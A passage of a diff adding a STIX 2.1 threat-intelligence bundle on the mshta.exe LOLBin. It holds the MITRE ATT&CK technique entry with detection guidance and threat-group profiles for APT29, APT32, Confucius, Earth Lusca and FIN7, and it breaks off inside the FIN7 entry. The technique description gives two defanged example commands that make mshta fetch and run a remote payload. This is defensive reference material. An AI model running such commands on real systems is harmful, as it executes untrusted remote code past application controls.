@@ -1,0 +1,2501 @@
+{
+  "spec_version": "2.1",
+  "id": "bundle--8fe3c6e9-cf57-46da-9080-6af62eb28c42",
+  "type": "bundle",
+  "objects": [
+    {
+      "name": "Nounou Mbeiri",
+      "description": "MITRE ATT&CK Defender (MAD) | Cyber Threat Intelligence researcher | Collaborator in Cyber Threat Intelligence community (GINSEG) | Public Speaking",
+      "identity_class": "individual",
+      "contact_information": "Twitter: @Nounou_Mbeiri",
+      "id": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "type": "identity",
+      "spec_version": "2.1",
+      "created": "2021-03-10T10:00:00.000Z",
+      "modified": "2021-03-10T10:00:00.000Z"
+    },
+    {
+      "name": "LOLBin: Mshta",
+      "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.",
+      "published": "2023-09-14T19:59:11.000Z",
+      "id": "report--588e068a-49cc-4390-85a6-2f9025919914",
+      "type": "report",
+      "spec_version": "2.1",
+      "created_by_ref": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "created": "2023-09-14T19:59:11.000Z",
+      "modified": "2023-09-14T19:59:11.000Z",
+      "report_types": [
+        "tool"
+      ],
+      "object_refs": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
+      ]
+    },
+    {
+      "modified": "2022-03-11T20:38:28.802Z",
+      "name": "mshta.exe",
+      "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
+        }
+      ],
+      "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_version": "2.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_data_sources": [
+        "Network Traffic: Network Connection Creation",
+        "Process: Process Creation",
+        "Command: Command Execution",
+        "File: File Creation"
+      ],
+      "x_mitre_defense_bypassed": [
+        "Application control",
+        "Digital Certificate Validation"
+      ],
+      "x_mitre_permissions_required": [
+        "User"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "@ionstorm",
+        "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
+        "Ricardo Dias"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "type": "tool",
+      "created": "2020-01-23T19:32:49.557Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1218.005",
+          "url": "https://attack.mitre.org/techniques/T1218/005"
+        },
+        {
+          "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf",
+          "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+          "source_name": "Cylance Dust Storm"
+        },
+        {
+          "source_name": "Red Canary HTA Abuse Part Deux",
+          "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+          "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+        },
+        {
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
+          "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+          "source_name": "FireEye Attacks Leveraging HTA"
+        },
+        {
+          "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+          "source_name": "Airbus Security Kovter Analysis",
+          "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+        },
+        {
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
+          "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+          "source_name": "FireEye FIN7 April 2017"
+        },
+        {
+          "source_name": "Wikipedia HTML Application",
+          "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+          "url": "https://en.wikipedia.org/wiki/HTML_Application"
+        },
+        {
+          "source_name": "MSDN HTML Applications",
+          "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+          "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+        },
+        {
+          "source_name": "LOLBAS Mshta",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+          "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."
+        }
+      ]
+    },
+    {
+      "modified": "2023-04-16T22:25:01.191Z",
+      "name": "APT29",
+      "description": "[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs RU Gov April 2021)(Citation: UK Gov Malign RIS Activity April 2021) They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised the Democratic National Committee starting in the summer of 2015.(Citation: F-Secure The Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: UK Gov UK Exposes Russia SolarWinds April 2021)\n\nIn April 2021, the US and UK governments attributed the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) to the SVR; public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021) Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Unit 42 SolarStorm December 2020)",
+      "aliases": [
+        "APT29",
+        "IRON RITUAL",
+        "IRON HEMLOCK",
+        "NobleBaron",
+        "Dark Halo",
+        "StellarParticle",
+        "NOBELIUM",
+        "UNC2452",
+        "YTTRIUM",
+        "The Dukes",
+        "Cozy Bear",
+        "CozyDuke",
+        "SolarStorm",
+        "Blue Kitsune"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "4.0",
+      "x_mitre_contributors": [
+        "Daniyal Naeem, BT Security",
+        "Matt Brenton, Zurich Insurance Group",
+        "Katie Nickels, Red Canary",
+        "Joe Gumke, U.S. Bank"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542",
+      "created": "2017-05-31T21:31:52.748Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0016",
+          "external_id": "G0016"
+        },
+        {
+          "source_name": "CozyDuke",
+          "description": "(Citation: Crowdstrike DNC June 2016)"
+        },
+        {
+          "source_name": "Cozy Bear",
+          "description": "(Citation: Crowdstrike DNC June 2016)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: CrowdStrike StellarParticle January 2022)"
+        },
+        {
+          "source_name": "StellarParticle",
+          "description": "(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: CrowdStrike StellarParticle January 2022)"
+        },
+        {
+          "source_name": "The Dukes",
+          "description": "(Citation: F-Secure The Dukes)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)"
+        },
+        {
+          "source_name": "APT29",
+          "description": "(Citation: F-Secure The Dukes)(Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)"
+        },
+        {
+          "source_name": "UNC2452",
+          "description": "(Citation: FireEye SUNBURST Backdoor December 2020)"
+        },
+        {
+          "source_name": "YTTRIUM",
+          "description": "(Citation: Microsoft Unidentified Dec 2018)"
+        },
+        {
+          "source_name": "NOBELIUM",
+          "description": "(Citation: MSTIC NOBELIUM Mar 2021)(Citation: MSTIC NOBELIUM May 2021)(Citation: MSTIC Nobelium Toolset May 2021)(Citation: MSRC Nobelium June 2021)"
+        },
+        {
+          "source_name": "Blue Kitsune",
+          "description": "(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)"
+        },
+        {
+          "source_name": "IRON HEMLOCK",
+          "description": "(Citation: Secureworks IRON HEMLOCK Profile)"
+        },
+        {
+          "source_name": "IRON RITUAL",
+          "description": "(Citation: Secureworks IRON RITUAL Profile)"
+        },
+        {
+          "source_name": "NobleBaron",
+          "description": "(Citation: SentinelOne NobleBaron June 2021)"
+        },
+        {
+          "source_name": "SolarStorm",
+          "description": "(Citation: Unit 42 SolarStorm December 2020)"
+        },
+        {
+          "source_name": "Dark Halo",
+          "description": "(Citation: Volexity SolarWinds)"
+        },
+        {
+          "source_name": "Crowdstrike DNC June 2016",
+          "description": "Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016.",
+          "url": "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+        },
+        {
+          "source_name": "Volexity SolarWinds",
+          "description": "Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020.",
+          "url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/"
+        },
+        {
+          "source_name": "CrowdStrike SUNSPOT Implant January 2021",
+          "description": "CrowdStrike Intelligence Team. (2021, January 11). SUNSPOT: An Implant in the Build Process. Retrieved January 11, 2021.",
+          "url": "https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/"
+        },
+        {
+          "source_name": "CrowdStrike StellarParticle January 2022",
+          "description": "CrowdStrike. (2022, January 27). Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign. Retrieved February 7, 2022.",
+          "url": "https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/"
+        },
+        {
+          "source_name": "GRIZZLY STEPPE JAR",
+          "description": "Department of Homeland Security and Federal Bureau of Investigation. (2016, December 29). GRIZZLY STEPPE – Russian Malicious Cyber Activity. Retrieved January 11, 2017.",
+          "url": "https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf"
+        },
+        {
+          "source_name": "FireEye APT29 Nov 2018",
+          "description": "Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018.",
+          "url": "https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html"
+        },
+        {
+          "source_name": "F-Secure The Dukes",
+          "description": "F-Secure Labs. (2015, September 17). The Dukes: 7 years of Russian cyberespionage. Retrieved December 10, 2015.",
+          "url": "https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf"
+        },
+        {
+          "source_name": "ESET Dukes October 2019",
+          "description": "Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020.",
+          "url": "https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+        },
+        {
+          "source_name": "FireEye SUNBURST Backdoor December 2020",
+          "description": "FireEye. (2020, December 13). Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor. Retrieved January 4, 2021.",
+          "url": "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
+        },
+        {
+          "source_name": "SentinelOne NobleBaron June 2021",
+          "description": "Guerrero-Saade, J. (2021, June 1). NobleBaron | New Poisoned Installers Could Be Used In Supply Chain Attacks. Retrieved August 4, 2021.",
+          "url": "https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/"
+        },
+        {
+          "source_name": "Microsoft Unidentified Dec 2018",
+          "description": "Microsoft Defender Research Team. (2018, December 3). Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers. Retrieved April 15, 2019.",
+          "url": "https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/"
+        },
+        {
+          "source_name": "MSTIC NOBELIUM May 2021",
+          "description": "Microsoft Threat Intelligence Center (MSTIC). (2021, May 27). New sophisticated email-based attack from NOBELIUM. Retrieved May 28, 2021.",
+          "url": "https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"
+        },
+        {
+          "source_name": "MSRC Nobelium June 2021",
+          "description": "MSRC. (2021, June 25). New Nobelium activity. Retrieved August 4, 2021.",
+          "url": "https://msrc-blog.microsoft.com/2021/06/25/new-nobelium-activity/"
+        },
+        {
+          "source_name": "MSTIC Nobelium Toolset May 2021",
+          "description": "MSTIC. (2021, May 28). Breaking down NOBELIUM’s latest early-stage toolset. Retrieved August 4, 2021.",
+          "url": "https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/"
+        },
+        {
+          "source_name": "MSTIC NOBELIUM Mar 2021",
+          "description": "Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021.",
+          "url": "https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
+        },
+        {
+          "source_name": "NCSC APT29 July 2020",
+          "description": "National Cyber Security Centre. (2020, July 16). Advisory: APT29 targets COVID-19 vaccine development. Retrieved September 29, 2020.",
+          "url": "https://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development-V1-1.pdf"
+        },
+        {
+          "source_name": "Cybersecurity Advisory SVR TTP May 2021",
+          "description": "NCSC, CISA, FBI, NSA. (2021, May 7). Further TTPs associated with SVR cyber actors. Retrieved July 29, 2021.",
+          "url": "https://www.ncsc.gov.uk/files/Advisory-further-TTPs-associated-with-SVR-cyber-actors.pdf"
+        },
+        {
+          "source_name": "NSA Joint Advisory SVR SolarWinds April 2021",
+          "description": "NSA, FBI, DHS. (2021, April 15). Russian SVR Targets U.S. and Allied Networks. Retrieved April 16, 2021.",
+          "url": "https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF"
+        },
+        {
+          "source_name": "PWC WellMess C2 August 2020",
+          "description": "PWC. (2020, August 17). WellMess malware: analysis of its Command and Control (C2) server. Retrieved September 29, 2020.",
+          "url": "https://www.pwc.co.uk/issues/cyber-security-services/insights/wellmess-analysis-command-control.html"
+        },
+        {
+          "source_name": "PWC WellMess July 2020",
+          "description": "PWC. (2020, July 16). How WellMess malware has been used to target COVID-19 vaccines. Retrieved September 24, 2020.",
+          "url": "https://www.pwc.co.uk/issues/cyber-security-services/insights/cleaning-up-after-wellmess.html"
+        },
+        {
+          "source_name": "Secureworks IRON HEMLOCK Profile",
+          "description": "Secureworks CTU. (n.d.). IRON HEMLOCK. Retrieved February 22, 2022.",
+          "url": "http://www.secureworks.com/research/threat-profiles/iron-hemlock"
+        },
+        {
+          "source_name": "Secureworks IRON RITUAL Profile",
+          "description": "Secureworks CTU. (n.d.). IRON RITUAL. Retrieved February 24, 2022.",
+          "url": "https://www.secureworks.com/research/threat-profiles/iron-ritual"
+        },
+        {
+          "source_name": "UK Gov Malign RIS Activity April 2021",
+          "description": "UK Gov. (2021, April 15). UK and US expose global campaign of malign activity by Russian intelligence services . Retrieved April 16, 2021.",
+          "url": "https://www.gov.uk/government/news/russia-uk-and-us-expose-global-campaigns-of-malign-activity-by-russian-intelligence-services"
+        },
+        {
+          "source_name": "UK Gov UK Exposes Russia SolarWinds April 2021",
+          "description": "UK Gov. (2021, April 15). UK exposes Russian involvement in SolarWinds cyber compromise . Retrieved April 16, 2021.",
+          "url": "https://www.gov.uk/government/news/russia-uk-exposes-russian-involvement-in-solarwinds-cyber-compromise"
+        },
+        {
+          "source_name": "UK NSCS Russia SolarWinds April 2021",
+          "description": "UK NCSC. (2021, April 15). UK and US call out Russia for SolarWinds compromise. Retrieved April 16, 2021.",
+          "url": "https://www.ncsc.gov.uk/news/uk-and-us-call-out-russia-for-solarwinds-compromise"
+        },
+        {
+          "source_name": "Unit 42 SolarStorm December 2020",
+          "description": "Unit 42. (2020, December 23). SolarStorm Supply Chain Attack Timeline. Retrieved March 24, 2023.",
+          "url": "https://unit42.paloaltonetworks.com/solarstorm-supply-chain-attack-timeline/"
+        },
+        {
+          "source_name": "White House Imposing Costs RU Gov April 2021",
+          "description": "White House. (2021, April 15). Imposing Costs for Harmful Foreign Activities by the Russian Government. Retrieved April 16, 2021.",
+          "url": "https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/15/fact-sheet-imposing-costs-for-harmful-foreign-activities-by-the-russian-government/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-21T21:04:18.158Z",
+      "name": "APT32",
+      "description": "[APT32](https://attack.mitre.org/groups/G0050) is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims.(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: ESET OceanLotus)",
+      "aliases": [
+        "APT32",
+        "SeaLotus",
+        "OceanLotus",
+        "APT-C-00"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.6",
+      "x_mitre_contributors": [
+        "Romain Dumont, ESET"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--247cb30b-955f-42eb-97a5-a89fef69341e",
+      "created": "2017-12-14T16:46:06.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0050",
+          "external_id": "G0050"
+        },
+        {
+          "source_name": "SeaLotus",
+          "description": "(Citation: Cybereason Oceanlotus May 2017)"
+        },
+        {
+          "source_name": "APT-C-00",
+          "description": "(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: Amnesty Intl. Ocean Lotus February 2021)"
+        },
+        {
+          "source_name": "APT32",
+          "description": "(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: Amnesty Intl. Ocean Lotus February 2021)"
+        },
+        {
+          "source_name": "OceanLotus",
+          "description": "(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: Amnesty Intl. Ocean Lotus February 2021)"
+        },
+        {
+          "source_name": "Amnesty Intl. Ocean Lotus February 2021",
+          "description": "Amnesty International. (2021, February 24). Vietnamese activists targeted by notorious hacking group. Retrieved March 1, 2021.",
+          "url": "https://www.amnestyusa.org/wp-content/uploads/2021/02/Click-and-Bait_Vietnamese-Human-Rights-Defenders-Targeted-with-Spyware-Attacks.pdf"
+        },
+        {
+          "source_name": "FireEye APT32 May 2017",
+          "description": "Carr, N.. (2017, May 14). Cyber Espionage is Alive and Well: APT32 and the Threat to Global Corporations. Retrieved June 18, 2017.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html"
+        },
+        {
+          "source_name": "Cybereason Oceanlotus May 2017",
+          "description": "Dahan, A. (2017, May 24). OPERATION COBALT KITTY: A LARGE-SCALE APT IN ASIA CARRIED OUT BY THE OCEANLOTUS GROUP. Retrieved November 5, 2018.",
+          "url": "https://www.cybereason.com/blog/operation-cobalt-kitty-apt"
+        },
+        {
+          "source_name": "ESET OceanLotus Mar 2019",
+          "description": "Dumont, R. (2019, March 20). Fake or Fake: Keeping up with OceanLotus decoys. Retrieved April 1, 2019.",
+          "url": "https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/"
+        },
+        {
+          "source_name": "ESET OceanLotus",
+          "description": "Foltýn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.",
+          "url": "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/"
+        },
+        {
+          "source_name": "Volexity OceanLotus Nov 2017",
+          "description": "Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.",
+          "url": "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Confucius",
+      "description": "[Confucius](https://attack.mitre.org/groups/G0142) is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between [Confucius](https://attack.mitre.org/groups/G0142) and [Patchwork](https://attack.mitre.org/groups/G0040), particularly in their respective custom malware code and targets.(Citation: TrendMicro Confucius APT Feb 2018)(Citation: TrendMicro Confucius APT Aug 2021)(Citation: Uptycs Confucius APT Jan 2021)",
+      "aliases": [
+        "Confucius",
+        "Confucius APT"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--6eded342-33e5-4451-b6b2-e1c62863129f",
+      "created": "2021-12-26T23:11:39.442Z",
+      "x_mitre_version": "1.0",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "G0142",
+          "url": "https://attack.mitre.org/groups/G0142"
+        },
+        {
+          "source_name": "TrendMicro Confucius APT Feb 2018",
+          "url": "https://www.trendmicro.com/en_us/research/18/b/deciphering-confucius-cyberespionage-operations.html",
+          "description": "Lunghi, D and Horejsi, J. (2018, February 13). Deciphering Confucius: A Look at the Group's Cyberespionage Operations. Retrieved December 26, 2021."
+        },
+        {
+          "source_name": "TrendMicro Confucius APT Aug 2021",
+          "url": "https://www.trendmicro.com/en_us/research/21/h/confucius-uses-pegasus-spyware-related-lures-to-target-pakistani.html",
+          "description": "Lunghi, D. (2021, August 17). Confucius Uses Pegasus Spyware-related Lures to Target Pakistani Military. Retrieved December 26, 2021."
+        },
+        {
+          "source_name": "Uptycs Confucius APT Jan 2021",
+          "url": "https://www.uptycs.com/blog/confucius-apt-deploys-warzone-rat",
+          "description": "Uptycs Threat Research Team. (2021, January 12). Confucius APT deploys Warzone RAT. Retrieved December 17, 2021."
+        }
+      ],
+      "x_mitre_deprecated": false,
+      "revoked": false,
+      "modified": "2022-06-30T20:15:32.697Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2022-10-17T19:51:56.531Z",
+      "name": "Earth Lusca",
+      "description": "[Earth Lusca](https://attack.mitre.org/groups/G1006) is a suspected China-based cyber espionage group that has been active since at least April 2019. [Earth Lusca](https://attack.mitre.org/groups/G1006) has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some [Earth Lusca](https://attack.mitre.org/groups/G1006) operations may be financially motivated.(Citation: TrendMicro EarthLusca 2022)\n\n[Earth Lusca](https://attack.mitre.org/groups/G1006) has used malware commonly used by other Chinese threat groups, including [APT41](https://attack.mitre.org/groups/G0096) and the [Winnti Group](https://attack.mitre.org/groups/G0044) cluster, however security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006)'s techniques and infrastructure are separate.(Citation: TrendMicro EarthLusca 2022)",
+      "aliases": [
+        "Earth Lusca",
+        "TAG-22"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.0",
+      "type": "intrusion-set",
+      "id": "intrusion-set--cc613a49-9bfa-4e22-98d1-15ffbb03f034",
+      "created": "2022-07-01T20:12:30.184Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G1006",
+          "external_id": "G1006"
+        },
+        {
+          "source_name": "TAG-22",
+          "description": "(Citation: Recorded Future TAG-22 July 2021)"
+        },
+        {
+          "source_name": "TrendMicro EarthLusca 2022",
+          "description": "Chen, J., et al. (2022). Delving Deep: An Analysis of Earth Lusca’s Operations. Retrieved July 1, 2022.",
+          "url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+        },
+        {
+          "source_name": "Recorded Future TAG-22 July 2021",
+          "description": "INSIKT GROUP. (2021, July 8). Chinese State-Sponsored Activity Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Other Tooling. Retrieved September 2, 2022.",
+          "url": "https://www.recordedfuture.com/chinese-group-tag-22-targets-nepal-philippines-taiwan"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "mobile-attack"
+      ],
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T03:51:04.185Z",
+      "name": "FIN7",
+      "description": "[FIN7](https://attack.mitre.org/groups/G0046) is a financially-motivated threat group that has been active since 2013 primarily targeting the U.S. retail, restaurant, and hospitality sectors, often using point-of-sale malware. A portion of [FIN7](https://attack.mitre.org/groups/G0046) was run out of a front company called Combi Security. Since 2020 [FIN7](https://attack.mitre.org/groups/G0046) shifted operations to a big game hunting (BGH) approach including use of [REvil](https://attack.mitre.org/software/S0496) ransomware and their own Ransomware as a Service (RaaS), Darkside. [FIN7](https://attack.mitre.org/groups/G0046) may be linked to the [Carbanak](https://attack.mitre.org/groups/G0008) Group, but there appears to be several groups using [Carbanak](https://attack.mitre.org/software/S0030) malware and are therefore tracked separately.(Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 April 2017)(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021)",
+      "aliases": [
+        "FIN7",
